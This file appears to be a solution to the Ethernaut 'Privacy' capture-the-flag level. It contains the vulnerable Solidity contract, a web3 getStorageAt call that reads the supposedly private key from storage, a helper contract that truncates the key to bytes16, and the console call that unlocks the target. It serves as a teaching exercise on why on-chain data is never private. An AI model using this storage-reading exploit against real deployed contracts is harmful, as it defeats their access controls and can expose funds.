//First compile the privacy.sol contract
//Then in the solidity IDE
//We read what is stored in the data[2] index
//web3.eth.getStorageAt('0x4a4a42ebf7b11961810a837be1521a8a0b260ba5', 3, function(err,res){console.log(res)})

//0xd1d04d8935007e8b5d8e3d7b29586519ade29155d919d3a062b7334e754a0130



pragma solidity ^0.4.18;

contract Privacy {

  bool public locked = true;
  uint256 public constant ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  function Privacy(bytes32[3] _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}

//Next we create a contract to hack privacy.sol
contract PrivacyHack{
    
    bytes32 data = 0xd1d04d8935007e8b5d8e3d7b29586519ade29155d919d3a062b7334e754a0130;//data[2]
    
    //we call hack to cast the bytes32 result into a bytes16 value.
    function hack() public view returns(bytes16){
        return bytes16(data);
    }
}

//finally in our web console we unlock the contract with the byte16 value
//await await contract.unlock('0xd1d04d8935007e8b5d8e3d7b29586519')
